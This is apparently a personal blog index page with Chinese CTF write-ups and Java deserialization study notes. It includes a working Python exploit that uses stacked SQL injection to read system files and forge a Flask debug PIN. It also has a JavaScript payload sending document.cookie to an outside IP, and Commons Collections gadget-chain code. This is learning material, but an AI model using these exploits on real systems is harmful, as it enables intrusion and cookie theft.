<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">260</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/17/2022-startCTF/">2022-starCTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-17</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着EDI打了，但是感觉环境挺坑的–</p>
<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>账号密码弱口令登录，然后，通过create 一个note 可以查询，发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.60.72.85:5002&#x2F;view?note_id&#x3D;p1ee659ofrlcro12mm3kp9ey5hwg464d</span><br></pre></td></tr></table></figure>

<p>报错存在flask的debug报错页面，存在sql的堆叠注入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220417153126.png" alt="image-20220417153125977"></p>
<p>因为是python的语言，比较有限，因此现在的思路就是读取文件伪造一下pin码：</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pin_mes</span>():</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    url=<span class="string">&quot;http://121.37.153.47:5002/view?note_id=&quot;</span></span><br><span class="line">    session=<span class="string">&quot;session=eyJjc3JmX3Rva2VuIjoiZWJiZmZjNDFlNGQ5YzQxODFjMDZhYTBjNWZjZjIyZDg2NzAzMTZkMyIsInVzZXJuYW1lIjoiYSJ9.YlpPdw.4WCCNhQrbYsuRjp00IeRuAtJZ7U&quot;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: session,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 1.username，用户名</span></span><br><span class="line"><span class="comment"># 2. uuidnode，当前网络的mac地址的十进制数</span></span><br><span class="line"><span class="comment"># 3. machine_id，docker机器id</span></span><br><span class="line"><span class="comment">#docker靶机由后面三个合并：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    pin_me=[<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;/proc/self/cgroup&#x27;</span>]</span><br><span class="line">    mess=[]</span><br><span class="line">    find_data=re.compile(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1 style=\&quot;text-align: center\&quot;&gt;</span></span><br><span class="line"><span class="string">        (.*?)</span></span><br><span class="line"><span class="string">    &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pin_me:</span><br><span class="line">        ran_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">7</span>))</span><br><span class="line">        payload=<span class="string">f&quot;1&#x27;;CREATE TABLE <span class="subst">&#123;ran_str&#125;</span> (go TEXT)%23&quot;</span></span><br><span class="line">        s.get(url+payload,headers=headers)</span><br><span class="line">        payload2=<span class="string">f&quot;1&#x27;;load data local infile \&quot;<span class="subst">&#123;i&#125;</span>\&quot; into table <span class="subst">&#123;ran_str&#125;</span>%23&quot;</span></span><br><span class="line">        s.get(url + payload2,headers=headers)</span><br><span class="line">        payload3=<span class="string">f&quot;1&#x27;union select 1,2,3,4,group_concat(go) from <span class="subst">&#123;ran_str&#125;</span>%23&quot;</span></span><br><span class="line">        r=s.get(url + payload3,headers=headers).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        data=re.findall(find_data,r)</span><br><span class="line">        mess.append(data)</span><br><span class="line">    <span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pypin</span>(<span class="params">gd,ma,cg</span>):</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;gd&#125;</span>&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">        <span class="comment"># e86c4117-eed3-4a37-82bc-b5fa47a88e0b eabeaffb4e97696bfb087df1717743237ff21f537c0f36676dd49ae6c6065d7e</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;ma+cg&#125;</span>&#x27;</span></span><br><span class="line">        <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    print(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pin_data=pin_mes()</span><br><span class="line">    print(pin_data[<span class="number">1</span>])</span><br><span class="line">    gd = int(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;&quot;</span>.join(pin_data[<span class="number">1</span>]).split(<span class="string">&quot;:&quot;</span>)),<span class="number">16</span>)</span><br><span class="line">    ma=str(<span class="string">&quot;&quot;</span>.join(pin_data[<span class="number">2</span>]))</span><br><span class="line">    cg = re.findall(<span class="string">r&quot;docker/(.*?),&quot;</span>, str(pin_data[<span class="number">3</span>]))[<span class="number">0</span>]</span><br><span class="line">    get_pypin(gd,ma,cg)</span><br></pre></td></tr></table></figure>

<p>拿到pin码以后就可以执行命令</p>
<p>然后比较奇怪的地方就是，有的时候console页面会显示not found，这里出题人给出的意见是</p>
<p>清除缓存即可。</p>
<h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>拿到flag的条件是让forecast==lotto_result，因此</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/15/java%E5%AE%A1%E8%AE%A1-lazymap/">java审计-lazymap</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-15</time><div class="content"><h2 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h2><p>学习了前面，我们知道在这个利用链中，比较关键的是需要有调动到transform类的方法，因为transform的四个方法组合一下，最终才能成功执行命令，但是在前面我们使用TransformedMap来执行命令的，而在Ysoserial中使用的是<code>lazymap</code>，关键的代码在于其get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(map.contain(Key)==<span class="keyword">false</span>)&#123;</span><br><span class="line">           Object value = factory.transform(key);</span><br><span class="line">           map.put(key,value);</span><br><span class="line">           <span class="keyword">return</span> value;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.get(key)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>在Lazymap，想要利用这个get方法，需要使用AnnotationInvocationHandler类的invoke方法</p>
<h2 id="java对象代理"><a href="#java对象代理" class="headerlink" title="java对象代理"></a>java对象代理</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>实现类似php的魔术方法_call，劫持一个对象内部的方法调用——<code>java.reflect.Proxy</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),Class[] &#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>

<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h3><p>Proxy.newProxyInstance的第一个参数是ClassLoader,，默认即可，第二个参数是需要代理的对象的集合，第三个参数是实现了InvocationHandler接口的对象，里面包含具体代理的逻辑</p>
<p>eg:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExampleInvocationHandler</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy,Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ExampleInvocationHandler类实现了invoke方法，作用是检测到调用方法名get的时候返回a和方法名</p>
<p>外部调用这个ExampleInvocationHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler; </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy; </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; </span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	InvocationHandler handler = <span class="keyword">new</span> ExampleInvocationHandler(<span class="keyword">new</span> HashMap());</span><br><span class="line">        Map proxyMap=(Map) Proxy.newwPorxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,hander);</span><br><span class="line">        </span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;wo&quot;</span>);</span><br><span class="line">        String result=(String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="触发Lazymap过程"><a href="#触发Lazymap过程" class="headerlink" title="触发Lazymap过程"></a>触发Lazymap过程</h3><p>1.AnnotationInvocationHandler是一个invocationhandler</p>
<p>2.我们将其对象进行proxy，在使用readObject时，调用任意方法，即进入invoke方法中，就会触发Lazymap#get</p>
<h2 id="LazyMap构造利用链"><a href="#LazyMap构造利用链" class="headerlink" title="LazyMap构造利用链"></a>LazyMap构造利用链</h2><p>1.使用Lazymap替换TransformedMap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>对象进行Proxy：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">Map proxyMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[] &#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>

</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/09/2022plaidctf/">2022plaidctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-09</time><div class="content"><h2 id="yaca"><a href="#yaca" class="headerlink" title="yaca"></a>yaca</h2><p>主要的漏洞点在这个位置,这里的content-type可以替换成其他内容，这样可以动态执行js的内容这里描述一下两种方法</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220411210553.png" alt="image-20220411210545854"></p>
<h3 id="importmap"><a href="#importmap" class="headerlink" title="importmap"></a>importmap</h3><p>这个是队内师傅做出来的方法，参考链接：<a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps">https://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps</a></p>
<p>content-type设为<code>importmap</code>的时候，可以动态加载js的代码，方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;importmap&quot;&gt;</span><br><span class="line">&#123;</span><br><span class="line">	&quot;imports&quot;:&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>由于无法导入外部的js，所以我们只能劫持本地的js，通过动态加载本地的eval-code.mjs也可以实现，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;type&quot;:&quot;importmap&quot;,</span><br><span class="line">	&quot;program&quot;:&#123;</span><br><span class="line">	&quot;name&quot;:&quot;new program&quot;,</span><br><span class="line">	&quot;scopes&quot;:&#123;</span><br><span class="line">	&quot;&#x2F;js&#x2F;&quot;:&#123;</span><br><span class="line">	&quot;&#x2F;js&#x2F;ast-to-js.mjs&quot;:&quot;&#x2F;js&#x2F;eval-code.mjs&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;code&quot;:&quot;&#123;\&quot;code\&quot;:\&quot;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;110.42.133.120:9999?flag&#x3D;&#39;+document.cookie\&quot;,\&quot;variables\&quot;:[]&#125;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复现成功</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220411230221.png" alt="image-20220411230221385"></p>
<h3 id="如何调用eval-code-js"><a href="#如何调用eval-code-js" class="headerlink" title="如何调用eval-code.js"></a>如何调用eval-code.js</h3><p>上面其他部分的原理都挺清晰的，就是这里如何调用有些问题,<del>想要看调用过程还得去debug吧</del>debug失败，所以还是继续读了一下源码，发现在calc中存在evalCode和js的eval也是一个东西，重点关注一下传入参数的方式以及参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220412202636.png"></p>
<p>可以发现在cacl计算模块当中使用的方法是这样的，传一个参数名为code，并且为json格式的即可</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220412221902.png" alt="image-20220412221902165"></p>
<p>执行的流程如下：一开始已经经过计算了，后面用再一次导入这个mjs文件，总共是导入两次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;js&#x2F;eval-code.mjs</span><br></pre></td></tr></table></figure>

<p>在第二次的时候执行了code里面的code参数，劫持成功</p>
<h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>这题想要解出来，首先要定位到那个content，一开始再看这个题目的时候，就感觉这里挺奇怪的，不过那两天有其他事情要做，所以就没怎么看了，然后接下来需要理清楚的是：<br>1.可以使用这个importmap类型进行操作，而这个类型是允许导入其他js模块进行动态加载的，由于不能导入其他外部，只能调用内部的，而这个eval-code.mjs，其实翻一下文件就可以发现了<br>2.对这个文件进行调用的方式为:主要是针对文件的源码进行审计。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/06/java-CommonCollections1%E5%88%A9%E7%94%A8/">java_CommonCollections1利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-06</time><div class="content"><h2 id="CommonCollections1利用链"><a href="#CommonCollections1利用链" class="headerlink" title="CommonCollections1利用链"></a>CommonCollections1利用链</h2><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>从P神的demo来理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">              <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来学习一下里面的接口和类</p>
<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap用于对java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们通过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的key的回调，valueTransormer是处理新元素的value的回调。我们所说的回调，并不是传统意义上的回调函数，而是一个实现了Transformer接口的类。</p>
<p>Transformer的作用是：对其集合的元素进行增加，删除或修改时调用transform方法进行<code>特定的修饰变换</code>，而这个transform是我们自己定义的</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，它只有一个待实现的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> object <span class="title">transform</span><span class="params">(object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调用transform方法，这个过程就类似在调用一个“回调函数”，这个回调的参数是原始对象。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是实现了Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">	iConstant=constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用是 包装任意一个对象，并且在执行回调时，返回这个对象，方便后续操作。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer是实现了Transformer接口的一个类，这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传入三个参数，第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class paramTypes, Object[] args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">    iMethodName=methodName;</span><br><span class="line">    iParamTypes=paramTypes;</span><br><span class="line">    iArgs=args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面的回调transform方法，就是执行了input对象的iMethodName方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(object input)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(input == <span class="keyword">null</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Class cls=input.getClass();</span><br><span class="line">		Method method = cls.getMethod(iMethodName,iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input,iArgs);</span><br><span class="line">	&#125;<span class="keyword">catch</span>(NoSuchMethodException ex)&#123;</span><br><span class="line">	 <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span>+iMethodName+<span class="string">&quot;&#x27;on&#x27;&quot;</span>+input.getClass() + <span class="string">&quot;&#x27;does not exist&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (IllegalAccessException ex)&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer的作用是将内部的多个Transformer串在一起，将前一个回调返回的结果，作为后一个回调的参数传入</p>
